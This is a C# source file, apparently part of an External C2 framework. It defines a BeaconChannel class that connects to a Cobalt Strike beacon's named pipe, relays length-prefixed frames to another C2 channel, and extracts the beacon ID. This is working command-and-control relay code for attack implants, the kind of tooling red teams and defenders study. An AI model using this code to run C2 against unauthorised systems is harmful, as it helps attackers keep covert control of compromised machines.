using System;
using System.IO;
using System.IO.Pipes;
using System.Threading;
using ExternalC2.Interfaces;

namespace ExternalC2.Channels
{
    /// <summary>
    ///     The C2 Channel used to communicate with the NamedPipe beacon
    /// </summary>
    public class BeaconChannel : IC2Channel
    {
        private const int MaxBufferSize = 1024 * 1024;

        /// <summary>
        ///     Construct new BeaconChannel
        /// </summary>
        public BeaconChannel()
        {
        }

        /// <summary>
        ///     Contruct new BeaconChannel with specificed PipeName
        /// </summary>
        /// <param name="pipeName"></param>
        public BeaconChannel(Guid pipeName)
        {
            SetPipeName(pipeName);
        }

        /// <summary>
        ///     The Cobalt Strike Beacon ID extracted from initial pipe->server frame
        /// </summary>
        public int ExternalId { get; private set; }

        /// <summary>
        ///     Name of the Pipe
        /// </summary>
        public Guid PipeName { get; private set; }

        /// <summary>
        ///     Client that interacts with the NamedPipe
        /// </summary>
        public NamedPipeClientStream Client { get; private set; }

        /// <summary>
        ///     Determines if connected or not
        /// </summary>
        public bool Connected => Client?.IsConnected ?? false;

        /// <summary>
        ///     Connects to the named pipe
        /// </summary>
        /// <returns>Whether connection was successful</returns>
        public bool Connect()
        {
            Client = new NamedPipeClientStream(PipeName.ToString());

            var tries = 0;
            while (Client.IsConnected == false)
            {
                if (tries == 20) break; // Failed to connect

                Client.Connect();
                tries += 1;

                Thread.Sleep(1000);
            }

            return Client.IsConnected;
        }

        /// <summary>
        ///     Closes connection to NamedPipe
        /// </summary>
        public void Close()
        {
            Client.Close();
        }

        /// <summary>
        ///     Closes the connection to the NamedPipe
        /// </summary>
        public void Dispose()
        {
            Client.Close();
        }

        /// <summary>
        ///     Reads a frame from the NamedPipe
        /// </summary>
        /// <returns>The frame bytes</returns>
        public byte[] ReadFrame()
        {
            var reader = new BinaryReader(Client);
            var bufferSize = reader.ReadInt32();
            var size = bufferSize > MaxBufferSize
                ? MaxBufferSize
                : bufferSize;

            return reader.ReadBytes(size);
        }

        /// <summary>
        ///     Writes a frame to the NamedPipe
        /// </summary>
        /// <param name="buffer"></param>
        public void SendFrame(byte[] buffer)
        {
            var writer = new BinaryWriter(Client);

            writer.Write(buffer.Length);
            writer.Write(buffer);
        }


        /// <summary>
        ///     Reads a frame from the NamedPipe and sends it to the other C2 channel
        /// </summary>
        /// <param name="c2"></param>
        /// <returns>Whether the read/send were successful</returns>
        public bool ReadAndSendTo(IC2Channel c2)
        {
            var buffer = ReadFrame();
            if (buffer.Length <= 0)
                return false;

            if (ExternalId == 0 && buffer.Length == 132)
                ExtractId(buffer);

            c2.SendFrame(buffer);

            return true;
        }

        /// <summary>
        ///     Sets the name of the pipe.
        /// </summary>
        /// <param name="pipeName">Name of the pipe.</param>
        public void SetPipeName(Guid pipeName)
        {
            PipeName = pipeName;
        }

        /// <summary>
        ///     Extracts the Cobalt Strike beacon identifier
        /// </summary>
        /// <param name="frame">The frame</param>
        private void ExtractId(byte[] frame)
        {
            using (var reader = new BinaryReader(new MemoryStream(frame)))
                ExternalId = reader.ReadInt32();

            Console.WriteLine($"[+] Extracted External Beacon Id: {ExternalId}");
        }

        /// <summary>
        /// Requests a stager from the channel
        /// </summary>
        /// <param name="pipeName"></param>
        /// <param name="is64Bit"></param>
        /// <param name="taskWaitTime"></param>
        /// <returns>
        /// The stager bytes
        /// </returns>
        /// <exception cref="NotImplementedException"></exception>
        public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
        {
            // Not implemented, the connector gets the stager for the beacon
            throw new NotImplementedException();
        }
    }
}